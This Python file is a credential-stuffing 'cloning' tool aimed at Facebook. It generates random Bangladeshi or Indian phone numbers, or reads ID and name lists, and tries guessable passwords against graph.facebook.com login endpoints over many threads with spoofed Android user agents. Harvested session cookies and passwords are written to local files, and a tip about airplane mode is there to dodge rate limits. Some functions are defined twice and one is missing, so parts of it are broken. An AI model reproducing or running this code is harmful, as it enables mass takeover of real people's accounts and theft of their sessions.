#__________________| IMPORT |__________________#
import os,random
import sys,time,uuid
try:
    import requests,bs4,mechanize,httpx
    import rich,json,subprocess,random,string
    from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
    print(f'\x1b[38;5;46m|∞| MISSING MODULE INSTALLING ')
    os.system('pip install requests rich')
    os.system('pip install mechanize')
    os.system('pip install bs4 httpx')
#__________________| LOOP |__________________#
loop=0;oks=[];cps=[];plist=[];user=[];cok=[]
#__________________| COLOUR |__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#__________________| LINEX |__________________#
def clear():os.system('clear');print(logo)
def linex():print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#__________________| RANDOM M1/M2 UA |__________________#
def uax():
    application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
    application_version_code=str(random.randint(000000000,999999999))
    fbs = random.choice(["com.facebook.katana"])
    ua = f'[FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBRV/{str(application_version_code)};FBPN/{str(fbs)};FBLC/en_GB;FBMF/Vivo;FBBD/Vivo;FBDV/'+str(random.choice(["X20Plus","1725","X21A","X21UD A","X21i A","V1809A","V1938T","V2001A","V1937","V2011A","V2046","V2338A","V2047","V2055A","AT&amp-T","Vivo Y15", "Y17s","Y36","X70 Pro 5G","Vivo X80 5G","Vivo Y22s","Vivo iQOO Neo9","Vivo V29","Vivo X100 Pro","Vivo V17 Pro","Vivo Y90","Vivo Y91i", "Vivo Y85"]))+';FBSV/'+str(random.randint(6,12))+';FBCA/armeabi-v7a:armeabi;FBDM/{density='+str(random.randint(2,3))+'.'+str(random.randint(2,5))+',width=1080,height='+str(random.randint(1400,1499))+'};'+'FB_FW/1;]'
    return ua
#__________________| FILE M1 UA |__________________#
def uax():
    ua = f"Dalvik/2.1.0 Linux; U; Android "+str(random.randrange(5,14))+"; "+str(random.choice(["GT-N7000","GT-I9220","SHV-E160L","SHV-E160S","SM-A013F","SM-A115W","SM-S9180","SPH-M840","SM-G973X","SM-G990B","SM-G900FD","SM-J326AZ","SM-X910B","SM-X916B","AT&amp;amp-T","Samsung Galaxy A05s", "Samsung Galaxy M34 5G","Samsung Galaxy F23 5G","Samsung Galaxy S23 Ultra","Samsung Galaxy S23+","Samsung Galaxy A34 5G","Samsung Galaxy M04","Samsung Galaxy A15","Samsung Galaxy Z Fold3 5G","Samsung Galaxy Z Fold5","Samsung Galaxy A04e","Samsung Galaxy A03s", "Galaxy A03s"]))+" Build/QP1A."+str(random.randrange(111111,999999))+") [FBAN/FB4A;FBAV/"+str(random.randint(199,399))+".0.0."+str(random.randint(1,9))+"."+str(random.randint(99,199))+";FBBV/"+str(random.randint(111111111,999999999))+";FBDM/{density="+str(random.randint(2,3))+"."+str(random.randint(2,5))+",width=1080,height="+str(random.randint(1400,1499))+"};FBLC/"+str(random.choice(["cs_CZ","en_GB","en_US","lt_LT","pl_PL","id_ID","ru_RU","pt_PT","he_IL","hi_IN","nl_NL"," it_IT","en_IN","es_ES","en_PK"]))+";FBCR/"+str(random.choice(["Tele2You","Telenor","FASTWEB","Banglalink","Sprint","Jazz","Vodafone IN","Vi India","Tele2 LT","Jio 4G","EE","Oi","MtelBG","AT&amp;amp-T","Ufone","Azercell"]))+";FBMF/Samsung;FBBD/"+str(random.choice(["Samsung","samsung","Samsung"]))+";FBPN/com.facebook.katana;FBDV/"+str(random.choice(["GT-N7000","GT-I9220","SHV-E160L","SHV-E160S","SM-A013F","SM-A115W","SM-S9180","SPH-M840","SM-G973X","SM-G990B","SM-G900FD","SM-J326AZ","SM-X910B","SM-X916B","AT&amp;amp-T","Samsung Galaxy A05s", "Samsung Galaxy M34 5G","Samsung Galaxy F23 5G","Samsung Galaxy S23 Ultra","Samsung Galaxy S23+","Samsung Galaxy A34 5G","Samsung Galaxy M04","Samsung Galaxy A15","Samsung Galaxy Z Fold3 5G","Samsung Galaxy Z Fold5","Samsung Galaxy A04e","Samsung Galaxy A03s", "Galaxy A03s"]))+";FBSV/"+str(random.randint(9,12))+";FBOP/1;FBCA/arm64-v8a:;]"
    return random.choice([ua])
#__________________| FILE M2 UA |__________________#
def uax():
    fb_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
    fb_ver_code=str(random.randint(000000000,999999999))
    mobile_version=str(random.randrange(6,13))
    numbr = f'{random.randint(111111, 999999)}.{random.randint(111,999)}'
    build = random.choice(["CPH9839.", "X9009.", "PHQ110.", "CPH2001.", "PADM00", "CPH1837.", "CPH2023.", "CPH2173.", "PEEM00.", "PHJ110.", "PEXM00", "R831K", "R831L", "OPD2201", "CPH1719", "CPH1721", "PBBT00", "R8200", "R8206", "CPH1664", "R829T", "X9079", "OPPO R9tm", "CPH1989", "CPH2237", "CPH2043", "OPPOX907", "OW19W1", "PCDM10", "PDHM00", "PHQ110", "CPH2185", "CPH2349", "CPH2223", "CPH2219"])
    fbs = random.choice(["com.facebook.adsmanager", "com.facebook.lite", "com.facebook.orca", "com.facebook.katana", "com.facebook.mlite"])
    uaxx = f'[FBAN/FB4A;FBAV/{str(fb_version)};FBBV/{str(fb_ver_code)};FBDM/'+'{density=2.5,width=1080,height=2400};'+f'FBLC/en_US;FBRV/{str(fb_ver_code)};FBCR/Ufone;FBMF/OPPO;FBBD/OPPO;FBPN/{str(fbs)};FBDV/STK-L21;FBSV/9,12;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    return random.choice([uaxx])
#__________________| LOGO |__________________#
logo=(f'''
                    {A}┏━━━━━━━━━┓
                    {A}┃{G}╔═══╦╗╔═╗{A}┃
                    {A}┃{G}║╔═╗║║║╔╝{A}┃
                    {A}┃{G}║╚═╝║╚╝╝{A}┃
                    {A}┃{G}║╔══╣╔╗║{A}┃
                    {A}┃{G}║║──║║║╚╗{A}┃
                    {A}┃{G}╚╝──╚╝╚═╝{A}┃
{A}━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━
{A}❲{G}✓{A}❳{G} DEVELOPER : PAVEL KAHN
{A}❲{G}✓{A}❳{G} TOOL      : FILE{A}/{G}RANDOM CLONING
{A}❲{G}✓{A}❳{G} VERSION   : 1.1
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
#__________________| KEY |__________________#
os.system('clear')   
import getpass
attemps = 0
os.system('clear')
print(logo)
while attemps < 999999999998888888888889999999999999999999999999999:
    fuck_x = input(f'{A}❲{G}✓{A}❳{G} YOUR LICENSE : ')
  
    os.system('clear');print(logo)
    if fuck_x == 'PK':
        print(f'{A}❲{G}✓{A}❳{G} LICENSE SUCCESSFUL')
        break
    else:
        attemps += 1
        continue
#__________________| MENU |__________________#
def menu():
    clear()
    print(f'{A}❲{G}1{A}❳{G} FILE CLONING')
    print(f'{A}❲{G}2{A}❳{G} RANDOM CLONING')
    print(f'{A}❲{G}0{A}❳{G} EXIT PROGRAM');linex()
    PAVEL = input(f'{A}❲{G}?{A}❳{G} CHOICE : ')
    if PAVEL in ['1']:
        filexx()
    elif PAVEL in ['2']:
        randmxx()
    elif PAVEL in ['0']:
        sys.exit()
    else:
        menu()
#__________________| RANDOM |__________________#
def randmxx():
    clear()
    print(f'{A}❲{G}1{A}❳{G} BD CLONING')
    print(f'{A}❲{G}2{A}❳{G} INDIA CLONING');linex()
    xxd = input(f'{A}❲{G}?{A}❳{G} CHOICE :{A} ')
    if xxd in ['1']:
        BD_X()
    elif xxd in ['2']:
        INDIA_X()
    else:
        randmxx()
#__________________| BD |__________________#
def BD_X():
    user=[]
    clear()
    print(f'{A}❲{G}✓{A}❳{G} EXAMPLE :{G} 017 {A}━{G} 019 {A}━{G} 018 {A}━{G} 016 {A}━{G} 013');linex()
    code = input(f'{A}❲{G}?{A}❳{G} CHOICE  :{A} ')
    clear()
    print(f'{A}❲{G}✓{A}❳{G} EXAMPLE :{G} 5000 {A}━{G} 10000 {A}━{G} 20000 {A}━{G} 99999');linex()
    limit = int(input(f'{A}❲{G}?{A}❳{G} CHOICE  :{A} '))
    clear()
    print(f'{A}❲{G}1{A}❳{G} METHOD :{G} X1')
    print(f'{A}❲{G}2{A}❳{G} METHOD :{G} X2');linex()
    mthd = input(f'{A}❲{G}?{A}❳{G} CHOICE :{A}  ')
    for x in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=50) as methodx:
        clear()
        tl = str(len(user))
        print(f'{A}❲{G}✓{A}❳{G} TOTAL UID  :{A} {tl} {A}━{G} SIM CODE :{A} {code}')
        print(f'{A}❲{G}✓{A}❳{G} USE FLIGHT {A}❲{G}AIRPLANE{A}❳{G} MODE BEFORE USE ');linex()
        for love in user:
            ids = code+love
            xx1 = love[:6]
            xx2 = love[:7]
            xxx3 = ids[:8]
            psd = [love,ids,xx1,xx2,xxx3,'Bangla','bangla','Free Fire','free fire','@#@#@#','@@@###']
            if mthd in ['1','01']:
            	methodx.submit(X1,ids,psd)
            elif mthd in ['2','02']:
            	methodx.submit(X2,ids,psd)
    print('')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f'{A}❲{G}✓{A}❳{G} THE PROCESS HAS BEEN COMPLETED')
    print(f'{A}❲{G}✓{A}❳{G} TOTAL OK : {str(len(oks))}')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    exit()
#__________________| INDIA |__________________#
def INDIA_X():
    user=[]
    clear()
    print(f'{A}❲{G}✓{A}❳{G} EXAMPLE :{G} +91639 {A}━{G} +91686 {A}━{G} +91147 {A}━{G} +91535 ');linex()
    code = input(f'{A}❲{G}?{A}❳{G} CHOICE  :{A} ')
    clear()
    print(f'{A}❲{G}✓{A}❳{G} EXAMPLE :{G} 5000 {A}━{G} 10000 {A}━{G} 20000 {A}━{G} 99999');linex()
    limit = int(input(f'{A}❲{G}?{A}❳{G} CHOICE  :{A} '))
    clear()
    print(f'{A}❲{G}1{A}❳{G} METHOD :{G} X1')
    print(f'{A}❲{G}2{A}❳{G} METHOD :{G} X2');linex()
    mthd = input(f'{A}❲{G}?{A}❳{G} CHOICE :{A}  ')
    for x in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=50) as methodx:
        clear()
        tl = str(len(user))
        print(f'{A}❲{G}✓{A}❳{G} TOTAL UID  :{A} {tl} {A}━{G} SIM CODE :{A} {code}')
        print(f'{A}❲{G}✓{A}❳{G} USE FLIGHT {A}❲{G}AIRPLANE{A}❳{G} MODE BEFORE USE ');linex()
        for love in user:
            ids = code+love
            psd = ['57575752','india123','57575751','57273200','59039200',ids,love,ids[3:]]
            if mthd in ['1','01']:
            	methodx.submit(X1,ids,psd)
            elif mthd in ['2','02']:
            	methodx.submit(X2,ids,psd)
    print('')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f'{A}❲{G}✓{A}❳{G} THE PROCESS HAS BEEN COMPLETED')
    print(f'{A}❲{G}✓{A}❳{G} TOTAL OK : {str(len(oks))}')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    exit()
#__________________| FILE |__________________#
def filexx():
    clear()
    print(f'{A}❲{G}✓{A}❳{G} EXAMPLE : /sdcard/PAVEL.txt');linex()
    file = input(f'{A}❲{G}?{A}❳{G} CHOICE  :{A} ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{A}❲{G}✓{A}❳{G} FILE NOT FOUND');time.sleep(1)
        filexx()
    clear()
    print(f'{A}❲{G}1{A}❳{G} METHOD :{G} X1')
    print(f'{A}❲{G}2{A}❳{G} METHOD :{G} X2');linex()
    mthd = input(f'{A}❲{G}?{A}❳{G} CHOICE :{A}  ')
    clear()
    print(f'{A}❲{G}✓{A}❳{G} EXAMPLE : {A}BD/{G}15-20 {A}━{G} {A}INDIA/{G}5-10');linex()
    limit = int(input(f'{A}❲{G}?{A}❳{G} PASS LIMIT : '))
    clear()
    for x in range(limit):
        print(f'{A}❲{G}✓{A}❳{G} EXAMPLE : firstlast {A}━{G} first123');linex()
        plist.append(input(f'{A}❲{G}✓{A}❳{G} PASSWORD NO {x+1} : '));linex()
    with tred(max_workers=40) as methodzz:
        tl = str(len(fo))
        clear()
        print(f'{A}❲{G}✓{A}❳{G} TOTAL UID :{A} {tl}')
        print(f'{A}❲{G}✓{A}❳{G} USE FLIGHT {A}❲{G}AIRPLANE{A}❳{G} MODE BEFORE USE ');linex()
        for user in fo:
            ids,names = user.split('|')
            psd = plist
            if mthd in ['1','01']:
            	methodzz.submit(filex1,ids,names,psd)
            elif mthd in ['2','02']:
            	methodzz.submit(filex2,ids,names,psd)
    print('')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f'{A}❲{G}✓{A}❳{G} THE PROCESS HAS BEEN COMPLETED')
    print(f'{A}❲{G}✓{A}❳{G} TOTAL OK : {str(len(oks))}')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    exit()
#__________________| RANDOM METHOD X1 |__________________#
def X1(ids,psd):
    global loop,oks,cps
    sys.stdout.write(f'\r\r{A}❲{G}PAVEL-X1{A}❳{G} {loop} {A}|{G} OK{A}|{G}CP {len(oks)} ')
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': uax(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                lk_removex = f'https://graph.facebook.com/{uid}/picture?type=normal'
                removex = requests.get(lk_removex).text
                if 'Photoshop' in removex:
                	print(f'\r\r{G}[PAVEL-OK] {uid} | {pas}');print(f'{A} {coki}');open('/sdcard/PAVEL-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');oks.append(uid);break
                else:pass
            else:continue
        loop+=1
    except Exception as e:
        pass
#__________________| RANDOM METHOD X2 |__________________#
def X1(ids,psd):
    global loop,oks,cps
    sys.stdout.write(f'\r\r{G}|{A}PAVEL-X2{G}|{A} {loop} {G}|{A} OK{G}|{A}CP {len(oks)} ')
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': uax(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                lk_removex = f'https://graph.facebook.com/{uid}/picture?type=normal'
                removex = requests.get(lk_removex).text
                if 'Photoshop' in removex:
                	print(f'\r\r{G}[PAVEL-OK] {uid} | {pas}');print(f'{A} {coki}');open('/sdcard/PAVEL-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');oks.append(uid);break
                else:pass
            else:continue
        loop+=1
    except Exception as e:
        pass
#__________________| FILE METHOD X1 |__________________#
def filex1(ids,names,psd):
    global loop,oks,cps
    sys.stdout.write(f'\r\r{A}❲{G}PAVEL-X1{A}❳{G} {loop} {A}|{G} OK{A}|{G}CP {len(oks)}{A}|{G}{len(cps)} ')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:ln = names.split(' ')[1]
        except:ln = fn
        for pw in psd:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            head={"User-Agent":uax(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
            if 'access_token' in po:
                print(f'\r\r{A}❲{G}PAVEL-OK{A}❳{G} {ids} | {pas}')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f"\r\r{A}❲{G}COOKIE{A}❳{G} {coki}")
                open('/sdcard/PAVEL-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{A}❲{Y}PAVEL-CP{A}❳{Y} {ids} | {pas}')
                open('/sdcard/PAVEL-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#__________________| FILE METHOD X2 |__________________#
def filex2(ids,names,psd):
    global loop,oks,cps
    sys.stdout.write(f'\r\r{G}|{A}PAVEL-X2{G}|{A} {loop} {G}|{A} OK{G}|{A}CP {len(oks)}{G}|{A}{len(cps)} ')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:ln = names.split(' ')[1]
        except:ln = fn
        for pw in psd:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': uax(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
            if 'access_token' in po:
                print(f'\r\r{G}|PAVEL-OK| {ids} | {pas}')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f"{G}|COOKIE|{A} {coki}")
                open('/sdcard/PAVEL-FILE-M2-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{M}|PAVEL-CP| {ids} | {pas}')
                open('/sdcard/PAVEL-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#update done
#__________________| END |__________________#
if __name__ == '__main__':
    menu()